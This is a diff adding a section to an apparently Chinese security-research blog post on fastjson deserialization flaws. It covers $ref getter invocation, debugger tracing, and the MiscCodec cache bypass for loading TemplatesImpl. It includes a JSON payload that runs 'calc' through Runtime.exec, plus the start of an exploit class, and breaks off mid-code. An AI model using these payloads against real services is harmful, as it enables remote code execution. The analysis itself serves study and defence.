@@ -307,7 +307,32 @@
         </li>
       </ol>
     </li>
-    <li><a href="#fastjson-1268版本漏洞分析及commons-io写文件">fastjson 1.2.68版本漏洞分析及commons-io写文件</a></li>
+    <li><a href="#fastjson-ref调用getter方法">fastjson $ref调用getter方法</a>
+      <ol>
+        <li><a href="#ref">$ref</a></li>
+        <li><a href="#调试-1">调试</a></li>
+        <li><a href="#利用ref打templatesimpl">利用$ref打TemplatesImpl</a>
+          <ol>
+            <li></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#fastjson-1268版本漏洞分析及commons-io写文件">fastjson 1.2.68版本漏洞分析及commons-io写文件</a>
+      <ol>
+        <li><a href="#throwabledeserializer">ThrowableDeserializer</a></li>
+        <li><a href="#javabeandeserializer">JavaBeanDeserializer</a></li>
+        <li><a href="#commons-io-2x写文件">Commons-io 2.x写文件</a>
+          <ol>
+            <li><a href="#调用任意inputstreamread">调用任意InputStream.read</a></li>
+            <li><a href="#传入字符串作为inputstream">传入字符串作为InputStream</a></li>
+            <li><a href="#inputstream转outputstream">InputStream转OutputStream</a></li>
+            <li><a href="#outputstream-输出到文件">OutputStream 输出到文件</a></li>
+            <li><a href="#poc-7">poc</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
   </ol>
 </nav>
         </div>
@@ -384,7 +409,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 20 分钟
+                    阅读时长: 33 分钟
                 </time>
             </div>
         
@@ -2937,10 +2962,1532 @@
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="fastjson-1268版本漏洞分析及commons-io写文件">fastjson 1.2.68版本漏洞分析及commons-io写文件
+</div><h2 id="fastjson-ref调用getter方法">fastjson $ref调用getter方法
+</h2><p>学习这个是为了方便学习1.2.68的漏洞</p>
+<p>在Fastjson&gt;=1.2.36时，可以用$ref的方式调用任意getter</p>
+<h3 id="ref">$ref
+</h3><p>$ref是fastjson里的引用，引用之前出现的对象</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th style="text-align: left">语法</th>
+          <th style="text-align: left">描述</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">{“$ref”:”$”}</td>
+          <td style="text-align: left">引用根对象</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">{“$ref”:”@”}</td>
+          <td style="text-align: left">引用自己</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">{“$ref”:”..”}</td>
+          <td style="text-align: left">引用父对象</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">{“$ref”:”../..”}</td>
+          <td style="text-align: left">引用父对象的父对象</td>
+      </tr>
+      <tr>
+          <td style="text-align: left">{“$ref”:”$.members[0].reportTo”}</td>
+          <td style="text-align: left">基于路径的引用</td>
+      </tr>
+  </tbody>
+</table></div>
+<p>先写的Test类，包含setter和getter方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Test</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getCmd</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">cmd</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setCmd</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cmd</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>测试ref的代码,这里ref也要写单独的json，用来引用数组中第一个元素的内容，所以用数组包裹了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">refTest</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ParserConfig</span><span class="p">.</span><span class="na">getGlobalInstance</span><span class="p">().</span><span class="na">setAutoTypeSupport</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;[{\&#34;@type\&#34;:\&#34;Test\&#34;,\&#34;cmd\&#34;:\&#34;calc\&#34;},{\&#34;$ref\&#34;:\&#34;$[0].cmd\&#34;}]&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>方便测试，所以把autoType开了</p>
+<h3 id="调试-1">调试
+</h3><p>跟进parse方法</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930202239120.png"
+	width="1118"
+	height="925"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930202239120_hu6970752069394658618.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930202239120_hu8856027162731833226.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250930202239120"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="120"
+		data-flex-basis="290px"
+	
+></p>
+<p>会调用handleResovleTask方法，跟进去看逻辑</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930225819255.png"
+	width="1391"
+	height="590"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930225819255_hu14341929731368106183.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930225819255_hu3182280464800259944.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250930225819255"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="235"
+		data-flex-basis="565px"
+	
+></p>
+<p>先判断ref的值是否是<code>$</code>开头，这里显然是，然后进到eval方法</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930233610768.png"
+	width="1204"
+	height="136"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930233610768_hu7091076080187911331.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930233610768_hu8470344908369905336.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250930233610768"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="885"
+		data-flex-basis="2124px"
+	
+></p>
+<p>这里进到jsonpath的eval,先用compile封装了一下，继续跟eval</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930233944695.png"
+	width="1271"
+	height="433"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930233944695_hu5769251135691057230.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930233944695_hu4744581964968422120.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250930233944695"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="293"
+		data-flex-basis="704px"
+	
+></p>
+<p>init进行初始化，然后segments就是前面init初始话后得到的数组（里面的内容实际上就是cmd），循环数组元素执行eval</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930234327619.png"
+	width="891"
+	height="356"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930234327619_hu1165476499206774289.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930234327619_hu10280889990885140974.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250930234327619"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="250"
+		data-flex-basis="600px"
+	
+></p>
+<p>我们的path不为<code>*</code>所以，创建了一个jsonpathparser，调用了explain方法</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930235244809.png"
+	width="996"
+	height="750"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930235244809_hu6909849351031448674.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250930235244809_hu9698594937217151253.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250930235244809"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="132"
+		data-flex-basis="318px"
+	
+></p>
+<p>这里的readSegement跟进去会跟据<code>.</code>和<code>/</code>分字符，所以最后得到的segment是cmd</p>
+<p>然后继续跟进segment的eval方法</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251001003242667.png"
+	width="1260"
+	height="297"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251001003242667_hu6423852220392538960.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251001003242667_hu2795500225360329909.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251001003242667"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="424"
+		data-flex-basis="1018px"
+	
+></p>
+<p>跟进getPropertyValue方法</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251001003414886.png"
+	width="1379"
+	height="498"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251001003414886_hu1778942879838529647.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251001003414886_hu4608633737376991597.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251001003414886"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="276"
+		data-flex-basis="664px"
+	
+></p>
+<p>调用getJavaBeanSerializer获取序列化器之后，调用了getFieldValue方法</p>
+<p>再跟就是跟fastjson的toJSONString后面一样了，这里的序列化器是ASMSerializer</p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251001003755573.png"
+	width="1095"
+	height="379"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251001003755573_hu2272398392111417261.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251001003755573_hu11226282160227872681.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251001003755573"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="288"
+		data-flex-basis="693px"
+	
+></p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251001003820464.png"
+	width="1298"
+	height="319"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251001003820464_hu928948083068062530.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251001003820464_hu14072763508440158271.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251001003820464"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="406"
+		data-flex-basis="976px"
+	
+></p>
+<p><img src="C:%5cUsers%5c10086%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20251001003841458.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20251001003841458"
+	
+	
+></p>
+<p>最终反射调用getter</p>
+<h3 id="利用ref打templatesimpl">利用$ref打TemplatesImpl
+</h3><p>这里要版本要&lt;=1.2.47才行，要用MiscCodec缓存绕过，因为1.2.36版本早就把TemplatesImpl加入黑名单了，而这个trick在1.2.48被修复了</p>
+<h5 id="misccodec缓存绕过">MiscCodec缓存绕过
+</h5><p>参考：<a class="link" href="https://curlysean.github.io/2025/03/13/FastJson%e5%90%84%e7%89%88%e6%9c%ac%e7%bb%95%e8%bf%87/#f9642"  target="_blank" rel="noopener"
+    >FastJson各版本绕过分析 | CurlySean&rsquo;s Blog</a></p>
+<p>首先是1.2.24版本后对调用的类有限制，会调用checkautoType来检查，然后这个1.2.47前的版本都是有一个缓存查找类的过程</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">getClassFromMapping</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">clazz</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">deserializers</span><span class="p">.</span><span class="na">findClass</span><span class="p">(</span><span class="n">typeName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">clazz</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">expectClass</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">expectClass</span><span class="p">.</span><span class="na">isAssignableFrom</span><span class="p">(</span><span class="n">clazz</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">JSONException</span><span class="p">(</span><span class="s">&#34;type not match. &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">typeName</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; -&gt; &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">expectClass</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>读取缓存时，是从<code>mappings</code>中寻找，所以我们需要寻找，在什么地方将类存入<code>mappings</code>的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">getClassFromMapping</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">className</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">mappings</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">className</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们找到的可控的方法，为<code>TypeUtils#loadClass</code>方法</p>
+<p>这代表的是，如果之前加载过这个类，就放入缓存中，下次加载的时候直接从缓存中拿出</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">loadClass</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">className</span><span class="p">,</span><span class="w"> </span><span class="n">ClassLoader</span><span class="w"> </span><span class="n">classLoader</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">className</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">className</span><span class="p">.</span><span class="na">length</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mappings</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">className</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">......</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后找哪个地方调用了<code>loadClass</code>方法，找到的可利用方法为<code>MiscCodec#deserialze</code></p>
+<p>在clazz等于Class.class的情况下，会调用<code>loadClass</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="nf">deserialze</span><span class="p">(</span><span class="n">DefaultJSONParser</span><span class="w"> </span><span class="n">parser</span><span class="p">,</span><span class="w"> </span><span class="n">Type</span><span class="w"> </span><span class="n">clazz</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">fieldName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">......</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">clazz</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">T</span><span class="p">)</span><span class="w"> </span><span class="n">TypeUtils</span><span class="p">.</span><span class="na">loadClass</span><span class="p">(</span><span class="n">strVal</span><span class="p">,</span><span class="w"> </span><span class="n">parser</span><span class="p">.</span><span class="na">getConfig</span><span class="p">().</span><span class="na">getDefaultClassLoader</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">......</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个<code>MiscCodec</code>是什么呢，它继承了<code>ObjectSerializer</code>与<code>ObjectDeserializer</code>，是一个序列化/反序列化器</p>
+<p>所以我们可以加载<code>Class.class</code>，使用<code>MiscCodec</code>反序列化器，调用<code>loadClass</code>，将类名传入，并放入缓冲区中</p>
+<p>当我们再次对类进行加载的时候，就直接从缓存中返回类</p>
+<h6 id="实现">实现
+</h6><p>第一步 反序列化一个Class类，值为恶意类</p>
+<p>第二步 接着用之前的payload</p>
+<p>加载第一个Class类时候设置类为Class类，后面的参数名就叫<code>val</code>即可，若不为它就会报错</p>
+<p>第二个类直接使用之前payload即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.parser.Feature</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MiscCodecAttack</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">TEM_CLASS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytecode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">generatePayload</span><span class="p">();</span><span class="w">
